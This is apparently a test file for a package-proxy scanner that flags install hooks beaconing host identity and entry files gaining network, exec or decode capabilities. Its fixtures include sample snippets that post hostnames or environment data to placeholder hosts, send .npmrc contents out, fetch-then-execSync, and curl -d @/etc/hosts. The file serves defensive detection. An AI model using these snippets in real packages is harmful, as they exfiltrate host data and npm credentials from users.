// 0.1.5 static checks S6 and S7 (operator rulings R2 and R3 2026-10-21), both CONTRIBUTING first, on recon's static-checks-1.4, then 1.5
// (ruling R5: the runtime mirrors recon's tree; names provisional until the operator's naming ruling).
//   S6 network-beacon-in-hook-target  a hook target with an API network sink (http-request, fetch, net-connect, websocket, xhr, axios),
//                                 a host-identity source (os.hostname(), os.userInfo(), os.networkInterfaces() on os or require('os'),
//                                 the env-dump marker, or USER, USERNAME, LOGNAME, HOSTNAME, COMPUTERNAME read from process.env) and NO
//                                 execution sink in the same file; url-literal is not a sink, a bare process.env read is not a source
//   S7 entry-capability-gain      main or bin gains a capability (net, exec, decode, obf, cred; url-literal never) its predecessor's
//                                 same-role file lacked, bin compared as the union; predecessor = the last version this proxy served
//                                 (witness.db entry facts, R4); cold start NOT_APPLICABLE; a refused or unread predecessor or current
//                                 file is NOT_CHECKED, never a clean delta. Review verdict 2026-10-21 on ABSENT: a role is verified
//                                 absent only on an archive read in full; the row says "verified absent" and "against an empty
//                                 baseline"; coverage counts a verified-absent role as checked
// static-checks-1.5 (operator rulings R9, R9a, R9b 2026-10-22): S7 is an INDICATOR only when a role READ on the predecessor (non-empty)
// and READ now gains a decode:* or obf:* class other than decode:Function, or an API network sink with an execution sink other than
// exec:Function; every other gain stays on the row as a fact with why it was not named.
// Failing first: written before the code (1.3 -> 1.4, then 1.4 -> 1.5). Tarballs are synthetic; nothing is run.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { createProxyServer } from '../../proxy/server.js';
import { resetDependencyCache } from '../../gates/dependency-cache.js';
import { forgetManifestHooks } from '../../proxy/manifest-check.js';
import { withRole } from '../../gates/row-class.js';

const SC = () => import('../../proxy/static-checks.js');
const S6 = 'static:S6-network-beacon-in-hook-target'; const S7 = 'static:S7-entry-capability-gain';

const H = 3_600_000; const T0 = Date.parse('2026-03-01T00:00:00Z'); const at = (h) => new Date(T0 + h * H).toISOString();
function hdr(name, size) {
  const h = Buffer.alloc(512, 0); Buffer.from(name, 'utf8').copy(h, 0, 0, 100);
  h.write('0000644\0', 100); h.write('0000000\0', 108); h.write('0000000\0', 116); h.write(`${size.toString(8).padStart(11, '0')}\0`, 124, 'latin1');
  h.write('00000000000\0', 136); h.write('        ', 148); h.write('0', 156, 'latin1'); h.write('ustar\0', 257, 'latin1'); h.write('00', 263, 'latin1');
  let sum = 0; for (let i = 0; i < 512; i += 1) sum += h[i]; h.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 'latin1'); return h;
}
const pad = (b) => Buffer.concat([b, Buffer.alloc((512 - (b.length % 512)) % 512, 0)]);
const tgz = (files) => zlib.gzipSync(Buffer.concat([...Object.entries(files).flatMap(([p, c]) => [hdr(`package/${p}`, Buffer.byteLength(c)), pad(Buffer.from(c))]), Buffer.alloc(1024, 0)]));
const BENIGN = 'module.exports = 1;\n';
const BEACON = 'const os = require("os");\nfetch("https://collect.example.invalid/b", { method: "POST", body: os.hostname() });\n';
const BEACON_ENV = 'const https = require("https");\nhttps.request({ host: "h" }).end(process.env.USERNAME);\n';
const BEACON_DUMP = 'const https = require("https");\nhttps.request({ host: "h" }).end(JSON.stringify(process.env));\n';
const LOADER = 'const https = require("https"); const cp = require("child_process");\nhttps.get("https://x.example.invalid/s", (r) => cp.execSync("x"));\nrequire("os").hostname();\n';
const URL_ONLY = 'const u = "https://collect.example.invalid/b"; module.exports = require("os").hostname() + u;\n';
const HOME_ONLY = 'fetch("https://x.example.invalid/", { body: process.env.HOME });\n';
const BEACON_BRACKET = 'const https = require("https");\nhttps.request({ host: "h" }).end(process.env["USER"]);\n';
const OTHER_RECV = 'const https = require("https");\nhttps.request({ host: "h" }).end(getOs().hostname());\n';
const NETEXEC = 'const cp = require("child_process");\nfetch("https://x.example.invalid/").then(() => cp.execSync("id"));\n';
const NETEXEC_CRED = 'const cp = require("child_process");\nfetch("https://x.example.invalid/", { body: require("fs").readFileSync(".npmrc") }).then(() => cp.execSync("id"));\n';
const NET_FUNCTION = 'fetch("https://x.example.invalid/").then((r) => new Function("r", "return r")(r));\n';
const ATOB = 'module.exports = atob("aGk=");\n';
const NETTY = 'const https = require("https");\nhttps.request({ host: "h" }).end(require("fs").readFileSync(".npmrc", "utf8"));\n';

const file = (p, s) => ({ path: p, buf: Buffer.from(s) });
const walkOf = (files, notKept = []) => ({ ok: true, files, notKept });
const rowOf = (rows, gate) => rows.find((r) => r.gate === gate);
const hookMan = { name: 'h', version: '1.0.0', scripts: { postinstall: 'node install.js' } };
const pred = (version, files, extra = {}) => ({ version, served_at: at(0), walk: 'read', reason: null, static_checks_version: undefined, files, ...extra });
const readEntry = (role, p, facts) => ({ role, path: p, state: 'read', size_bytes: 20, sha256: 'x', facts, reason: null });
const NOFACTS = { binary: false, net_sinks: [], exec_sinks: [], obf_idents: 0, decode_markers: [], hex_density: 0, numeric_hex: 0, cred_sources: [], sinks: [], overrides: [], address_families: [], host_identity: [] };

// ------------------------------------------------------------------ the check list and the roles
test('S67-U1 eight static checks S0-S7; S6 and S7 are named since rulings R7, R9 2026-10-22 (their WARN stays WARN; were contributing); "not armed" covers all eight', async () => {
  const S = await SC();
  assert.deepEqual(S.CHECKS.map((c) => c.id), ['S0', 'S1', 'S2', 'S3', 'S4', 'S5', 'S6', 'S7', 'S8', 'S9']);   // S8, S9: 1.8 (declared)
  assert.ok(S.STATIC_GATES.includes(S6) && S.STATIC_GATES.includes(S7));
  assert.equal(withRole({ gate: S6, result: 'WARN', detail: 'x' }).result, 'WARN');
  assert.equal(withRole({ gate: S7, result: 'WARN', detail: 'x' }).result, 'WARN');
  assert.equal(S.unarmedRows('why').length, 10);
  const six = S.CHECKS.slice(0, 6).map((c) => ({ gate: c.gate, result: 'ALLOW', detail: 'x' }));
  assert.equal(S.staticSettled({ gates_fired: six }), false, 'a record from before S6 and S7 is retried when a later download is armed');
});

// ------------------------------------------------------------------ S0 1.4: sh -c one level, absolute-path network tools
test('S67-U0 S0 1.4 reads the quoted argument of sh|bash|dash|zsh -c one level deep; an absolute-path tool counts, a relative one does not', async () => {
  const S = await SC();
  const fx = (c) => S.hookFetchExec(c);
  assert.equal(fx("sh -c 'curl -d @/etc/hosts https://a.example.invalid'").exfil, true);
  assert.deepEqual(fx("sh -c 'curl -d @/etc/hosts https://a.example.invalid'").net_tools, ['curl']);
  assert.equal(fx('bash -lc "wget --post-data=x http://h.example.invalid"').exfil, true, 'flag groups such as -lc');
  assert.equal(fx('/usr/bin/curl --data x https://a.example.invalid').exfil, true, 'absolute path, by basename');
  assert.equal(fx('./node_modules/.bin/curl -d x https://a.example.invalid').exfil, false, 'a relative path does not count');
  assert.equal(fx(`bash -c "sh -c 'curl -d x https://a.example.invalid'"`).exfil, false, 'one level only');
  assert.equal(fx('node -e "require(1)"').fires, false, 'node -e is not a shell');
});

// ------------------------------------------------------------------ S6 over hook targets (R2)
test('S67-U2 S6 fires on a hook target with an API network sink, a host-identity source and no execution sink', async () => {
  const S = await SC();
  for (const body of [BEACON, BEACON_ENV, BEACON_DUMP, BEACON_BRACKET]) {
    const r = rowOf(S.staticRows({ manifest: hookMan, walk: walkOf([file('install.js', body)]), armed: 'identity-break' }), S6);
    assert.equal(r?.result, 'WARN', `${body}: ${JSON.stringify(r)}`);
    assert.match(r.detail, /^hook target install\.js \(\d+ B\) has a network API sink \([^)]+\) and a host-identity source \([^)]+\) and no execution sink; armed by identity-break$/);
  }
  assert.deepEqual(S.fileFacts(file('a.js', BEACON)).host_identity, ['os.hostname']);
  assert.deepEqual(S.fileFacts(file('a.js', 'require("os").userInfo();')).host_identity, ['os.userInfo']);
  assert.deepEqual(S.fileFacts(file('a.js', BEACON_BRACKET)).host_identity, ['identity-env']);
});

test('S67-U3 S6 does not fire: an execution sink in the same file (S1 territory), url-literal as the only sink, a bare process.env read, another receiver, or an entry file', async () => {
  const S = await SC();
  const s6 = (man, files) => rowOf(S.staticRows({ manifest: man, walk: walkOf(files), armed: 'identity-break' }), S6);
  assert.equal(s6(hookMan, [file('install.js', LOADER)]).result, 'ALLOW');
  assert.equal(s6(hookMan, [file('install.js', URL_ONLY)]).result, 'ALLOW', 'url-literal is not a sink');
  assert.equal(s6(hookMan, [file('install.js', HOME_ONLY)]).result, 'ALLOW', 'process.env.HOME is not a host-identity source');
  assert.equal(s6(hookMan, [file('install.js', OTHER_RECV)]).result, 'ALLOW', 'only os or require("os") is the receiver');
  assert.match(s6(hookMan, [file('install.js', BENIGN)]).detail, /^hook targets carry no network beacon \(1 file read\)/);
  const r = s6({ name: 'h', main: 'index.js' }, [file('index.js', BEACON)]);
  assert.equal(r.result, 'ALLOW'); assert.match(r.detail, /^no hook target to read/);
});

// ------------------------------------------------------------------ S7 pure: capabilities, the summary, the delta (recon's rules)
test('S67-U8 capabilitiesOf: net (API sinks only), exec, decode, obf (_0x identifiers at the S2 count), cred; binary carries none', async () => {
  const S = await SC();
  const F = { ...NOFACTS, net_sinks: ['url-literal', 'fetch'], exec_sinks: ['eval'], decode_markers: ['atob'], obf_idents: 20, cred_sources: ['npmrc'] };
  assert.deepEqual(S.capabilitiesOf(F), ['net:fetch', 'exec:eval', 'decode:atob', 'obf:_0x-idents', 'cred:npmrc']);
  assert.deepEqual(S.capabilitiesOf({ ...F, obf_idents: 19 }).includes('obf:_0x-idents'), false);
  assert.deepEqual(S.capabilitiesOf({ binary: true }), []);
});

test('S67-U9 capabilityDelta: a NOT_CHECKED predecessor is checked before the cold start; a role ABSENT on the predecessor compares as empty; bin is the union', async () => {
  const S = await SC();
  const sum = (main, bin) => ({ version: 'static-checks-1.4', archive_read_in_full: true, by_role: { main, bin } });
  const READ = (caps) => ({ status: 'READ', caps, files: ['x'], not_checked: [] });
  const ABS = { status: 'ABSENT', caps: [], files: [], not_checked: [], absent: 'no candidate file in the tarball (verified absent)' };
  const NONE_DECL = { status: 'ABSENT', caps: [], files: [], not_checked: [], absent: 'none declared (no candidate on the keep list)' };
  assert.equal(S.capabilityDelta({ predecessor: { version: null, basis: 'b', status: 'NOT_CHECKED', reason: 'r' }, current: sum(READ([]), NONE_DECL) }).outcome, 'NOT_CHECKED');
  assert.equal(S.capabilityDelta({ predecessor: { version: null, basis: 'b' }, current: sum(READ([]), NONE_DECL) }).outcome, 'NOT_APPLICABLE');
  // 1.5: a gain against a verified-absent predecessor role is a fact, never named (predecessor_nonempty false)
  const d = S.capabilityDelta({ predecessor: { version: '1.0.0', basis: 'b', summary: sum(ABS, NONE_DECL) }, current: sum(READ(['decode:atob', 'net:fetch']), NONE_DECL) });
  assert.equal(d.outcome, 'NONE'); assert.deepEqual(d.by_role.main.gains, ['decode:atob', 'net:fetch']); assert.equal(d.by_role.main.predecessor_role, 'absent');
  assert.equal(d.by_role.main.predecessor_nonempty, false); assert.deepEqual(d.by_role.main.named, []); assert.match(d.by_role.main.not_named, /verified absent/);
  assert.deepEqual(d.coverage, { roles: 2, checked: 2, verified_absent: 1, not_checked: 0, note: d.coverage.note });
  const n = S.capabilityDelta({ predecessor: { version: '1.0.0', basis: 'b', summary: sum(READ([]), NONE_DECL) }, current: sum(READ(['cred:npmrc', 'exec:child_process', 'net:fetch']), NONE_DECL) });
  assert.equal(n.outcome, 'INDICATOR'); assert.equal(n.by_role.main.predecessor_nonempty, true);
  assert.deepEqual(n.by_role.main.arms, ['net+exec']); assert.deepEqual(n.by_role.main.named, ['exec:child_process', 'net:fetch']); assert.deepEqual(n.by_role.main.gains, ['cred:npmrc', 'exec:child_process', 'net:fetch']);
  const u = S.capabilityDelta({ predecessor: { version: '1.0.0', basis: 'b', summary: sum(READ([]), READ(['exec:spawn', 'net:fetch'])) }, current: sum(READ([]), READ(['net:fetch'])) });
  assert.equal(u.outcome, 'NONE');
});

// ------------------------------------------------------------------ S7 rows against the stored predecessor (R3)
const mainMan = { name: 'm', version: '1.1.0', main: 'index.js' };
const BASIS = 'the version this proxy served before';
const COV = (checked, va, nc) => `roles checked ${checked} of 2 (${va} verified absent, counted as checked for S7), not checked ${nc}`;
const NOBIN = 'current bin: none declared (no candidate on the keep list)';
test('S67-U4 S7 cold start: no earlier version served by this proxy is NOT_APPLICABLE, stated, never a clean delta', async () => {
  const S = await SC();
  const r = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', NETTY)]), armed: 'entry-path-change', predecessor: null }), S7);
  assert.equal(r.result, 'SKIP'); assert.equal(r.detail, 'not applicable: no earlier version served by this proxy; armed by entry-path-change');
});

const NOT_NAMED = 'no decode/obf gain other than decode:Function, no net+exec pair other than exec:Function';   // the row's short form of recon's reason (detail cap)
test('S67-U5 S7 fires (1.5) when main, read and non-empty before, gains an API network sink with an execution sink; the row names the predecessor, its basis, the arm and the named gains beside the full gain set', async () => {
  const S = await SC();
  const p = pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)]);
  const r = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', NETEXEC_CRED)]), armed: 'entry-path-change', predecessor: p }), S7);
  assert.equal(r.result, 'WARN', JSON.stringify(r));
  assert.equal(r.detail, `vs 1.0.0 (${BASIS}): main gained cred:npmrc, exec:child_process, net:fetch (net+exec: exec:child_process, net:fetch); ${NOBIN}; ${COV(2, 1, 0)}; armed by entry-path-change`);
  const a = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', ATOB)]), armed: 'x', predecessor: p }), S7);
  assert.equal(a.result, 'WARN'); assert.equal(a.detail, `vs 1.0.0 (${BASIS}): main gained decode:atob (decode-obf: decode:atob); ${NOBIN}; ${COV(2, 1, 0)}; armed by x`);
});

test('S67-U5c S7 1.5 names no other gain: a network sink with a credential source, or the Function constructor on both arms, is a fact on the row with why it is not named', async () => {
  const S = await SC();
  const p = pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)]);
  const r = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', NETTY)]), armed: 'x', predecessor: p }), S7);
  assert.equal(r.result, 'ALLOW', JSON.stringify(r));
  assert.equal(r.detail, `no gain named vs 1.0.0 (${BASIS}); main gained cred:npmrc, net:http-request (not named: ${NOT_NAMED}); ${NOBIN}; ${COV(2, 1, 0)}; armed by x`);
  const f = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', NET_FUNCTION)]), armed: 'x', predecessor: p }), S7);
  assert.equal(f.result, 'ALLOW', JSON.stringify(f));
  assert.equal(f.detail, `no gain named vs 1.0.0 (${BASIS}); main gained decode:Function, exec:Function, net:fetch (not named: ${NOT_NAMED}); ${NOBIN}; ${COV(2, 1, 0)}; armed by x`);
});

test('S67-U5b S7 against an empty baseline: the predecessor\'s main was verified absent, so the new main\'s capabilities are gains, kept as facts and never named (1.5)', async () => {
  const S = await SC();
  const p = pred('1.0.0', [{ role: 'main', path: 'index.js', state: 'absent', size_bytes: null, sha256: null, facts: null, reason: null }]);
  const r = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', NETEXEC)]), armed: 'x', predecessor: p }), S7);
  assert.equal(r.result, 'ALLOW', JSON.stringify(r));
  assert.equal(r.detail, `no gain named vs 1.0.0 (${BASIS}); main gained exec:child_process, net:fetch (not named: predecessor main was not read and non-empty (verified absent): a gain against it is a fact, not the named condition); ${NOBIN}; ${COV(2, 1, 0)}; armed by x`);
});

test('S67-U6 S7 does not fire on the same capabilities, on url-literal alone, or on a current main verified absent', async () => {
  const S = await SC();
  const had = pred('1.0.0', [readEntry('main', 'index.js', { ...NOFACTS, net_sinks: ['http-request'], cred_sources: ['npmrc'] })]);
  const same = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', NETTY)]), armed: 'x', predecessor: had }), S7);
  assert.equal(same.result, 'ALLOW'); assert.equal(same.detail, `no capability gained vs 1.0.0 (${BASIS}); ${NOBIN}; ${COV(2, 1, 0)}; armed by x`);
  const none = pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)]);
  assert.equal(rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', URL_ONLY)]), armed: 'x', predecessor: none }), S7).result, 'ALLOW', 'url-literal excluded');
  const gone = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([], [{ path: 'index.js', reason: 'not in the archive' }]), armed: 'x', predecessor: had }), S7);
  assert.equal(gone.result, 'ALLOW'); assert.equal(gone.detail, `no capability gained vs 1.0.0 (${BASIS}); current main: no candidate file in the tarball (verified absent); ${NOBIN}; ${COV(2, 2, 0)}; armed by x`);
});

test('S67-U7 S7 NOT_CHECKED: a refused predecessor archive, unreadable stored facts, an unread predecessor or current file, a binary file, or facts from another static-checks version', async () => {
  const S = await SC();
  const s7 = (p, walk = walkOf([file('index.js', NETTY)])) => rowOf(S.staticRows({ manifest: mainMan, walk, armed: 'x', predecessor: p }), S7);
  let r = s7(pred('1.0.0', [], { walk: 'refused', reason: 'tar: truncated archive' }));
  assert.equal(r.result, 'SKIP'); assert.equal(r.detail, 'not checked: predecessor 1.0.0: its archive was refused (tar: truncated archive); armed by x');
  r = s7('unreadable');
  assert.equal(r.result, 'SKIP'); assert.equal(r.detail, 'not checked: predecessor (not determined): the stored entry facts of earlier versions could not be read; armed by x');
  r = s7(pred('1.0.0', [{ role: 'main', path: 'index.js', state: 'not-read', size_bytes: 2_000_000, sha256: null, facts: null, reason: 'over the kept-file cap (1048576 bytes)' }]));
  assert.equal(r.result, 'SKIP'); assert.equal(r.detail, `not checked: predecessor main index.js was not read (over the kept-file cap (1048576 bytes)); vs 1.0.0 (${BASIS}); ${NOBIN}; ${COV(1, 1, 1)}; armed by x`);
  r = s7(pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)]), walkOf([], [{ path: 'index.js', reason: 'over the kept-file cap (1048576 bytes)', size: 2_000_000 }]));
  assert.equal(r.result, 'SKIP'); assert.match(r.detail, /^not checked: current main index\.js was not read \(over the kept-file cap/);
  r = s7(pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)]), walkOf([{ path: 'index.js', buf: Buffer.from('a\0b') }]));
  assert.equal(r.result, 'SKIP'); assert.match(r.detail, /^not checked: current main index\.js was not read \(binary/);
  r = s7(pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)], { static_checks_version: 'static-checks-0.9' }));
  assert.equal(r.result, 'SKIP'); assert.equal(r.detail, 'not checked: predecessor 1.0.0: its facts were stored by static-checks-0.9, not static-checks-1.9; armed by x');
  // since 0.1.6: 1.8.1 changes a fact field only, so facts stored by 1.8 are compared; 1.7's are not
  r = s7(pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)], { static_checks_version: 'static-checks-1.8' }));
  assert.notEqual(r.result, 'SKIP', r.detail);
  r = s7(pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)], { static_checks_version: 'static-checks-1.7' }));
  assert.equal(r.result, 'SKIP'); assert.match(r.detail, /stored by static-checks-1\.7, not static-checks-1\.9/);
  // 1.9 changes S0 and S6 only, so facts stored by 1.8.1 are compared too
  r = s7(pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)], { static_checks_version: 'static-checks-1.8.1' }));
  assert.notEqual(r.result, 'SKIP', r.detail);
});

// ------------------------------------------------------------------ end to end: the predecessor is the last version this proxy served
// e: nine versions; 1.7.0 keeps index.js (benign); 1.8.0 moves main to lib/run.js, which fetches and executes -> entry-path-change arms
const EV = Array.from({ length: 9 }, (_, i) => `1.${i}.0`);
const REAL = (name, v) => ({ _npmUser: { name: 'maintainer', email: 'm@example.com' }, _npmVersion: '10.9.2',
  dist: { shasum: `shasum-${name}-${v}`, integrity: `sha512-${name}-${v}==`, tarball: `https://registry.npmjs.org/${name}/-/${name}-${v}.tgz`, unpackedSize: 1000 } });
const E = { name: 'e', 'dist-tags': { latest: '1.8.0' }, time: Object.fromEntries(EV.map((v, i) => [v, at(48 * i)])),
  versions: Object.fromEntries(EV.map((v) => [v, { name: 'e', version: v, main: v === '1.8.0' ? 'lib/run.js' : 'index.js', ...REAL('e', v) }])) };
const DOCS = { '/e': E };
const TARBALLS = {
  '/e/-/e-1.7.0.tgz': tgz({ 'package.json': JSON.stringify(E.versions['1.7.0']), 'index.js': BENIGN }),
  '/e/-/e-1.8.0.tgz': tgz({ 'package.json': JSON.stringify(E.versions['1.8.0']), 'lib/run.js': NETEXEC }),
};
async function withProxy(fn) {
  resetDependencyCache(); forgetManifestHooks();
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cft015-s67-'));
  const upstream = http.createServer((req, res) => {
    const u = decodeURIComponent(req.url.split('?')[0]);
    if (TARBALLS[u]) { res.writeHead(200, { 'content-type': 'application/octet-stream' }); res.end(TARBALLS[u]); return; }
    if (DOCS[u]) { res.writeHead(200, { 'content-type': 'application/json' }); res.end(JSON.stringify(DOCS[u])); return; }
    res.writeHead(404, { 'content-type': 'application/json' }); res.end('{}');
  });
  await new Promise((r) => upstream.listen(0, '127.0.0.1', r));
  const proxy = createProxyServer({ port: 0, host: '127.0.0.1', upstream: `http://127.0.0.1:${upstream.address().port}`,
    witnessDbPath: path.join(dir, 'witness.db'), headersTimeoutMs: 10_000, bodyTimeoutMs: 10_000 });
  await new Promise((r) => proxy.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${proxy.address().port}`;
  try { return await fn({ base, proxy }); } finally {
    await new Promise((r) => proxy.close(r)); await new Promise((r) => upstream.close(r)); fs.rmSync(dir, { recursive: true, force: true });
    resetDependencyCache(); forgetManifestHooks();
  }
}
const get = (u) => new Promise((resolve, reject) => http.get(u, { agent: false }, (res) => {
  const chunks = []; res.on('data', (x) => chunks.push(x)); res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(chunks) }));
}).on('error', reject));
const settle = () => new Promise((r) => setTimeout(r, 200));

test('S67-E1 S7 end to end: 1.7.0 served first, then 1.8.0 (armed by entry-path-change) records S7 as a named WARN against 1.7.0 (NOTE before R9)', async () => {
  await withProxy(async ({ base, proxy }) => {
    await get(`${base}/e`); await get(`${base}/e`);
    await get(`${base}/e/-/e-1.7.0.tgz`); await settle();
    await get(`${base}/e/-/e-1.8.0.tgz`); await settle();
    const r = proxy.witnessDb.getLatestDecision('e', '1.8.0').gates_fired.find((g) => g.gate === S7);
    assert.equal(r?.result, 'WARN', JSON.stringify(r));
    assert.equal(r.detail, `vs 1.7.0 (${BASIS}): main gained exec:child_process, net:fetch (net+exec: exec:child_process, net:fetch); ${NOBIN}; ${COV(2, 1, 0)}; armed by entry-path-change`);
  });
});

test('S67-E2 the predecessor is the version served BEFORE: a version served later is never the predecessor of one served earlier', async () => {
  const { openWitnessDB } = await import('../../witness/db.js');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cft015-s67db-'));
  const db = openWitnessDB(path.join(dir, 'w.db')); db.applySchema();
  try {
    const rec = (v) => db.recordEntryFacts({ package_name: 'a', version: v, walk: 'read', reason: null, static_checks_version: 'x', files: [] });
    rec('1.0.0'); rec('1.1.0'); rec('1.2.0');
    assert.equal(db.predecessorEntryFacts('a', '1.1.0').version, '1.0.0');
    assert.equal(db.predecessorEntryFacts('a', '1.0.0'), null);
    assert.equal(db.predecessorEntryFacts('a', '1.3.0').version, '1.2.0', 'a version not yet stored: the last one served');
  } finally { db.close(); fs.rmSync(dir, { recursive: true, force: true }); }
});
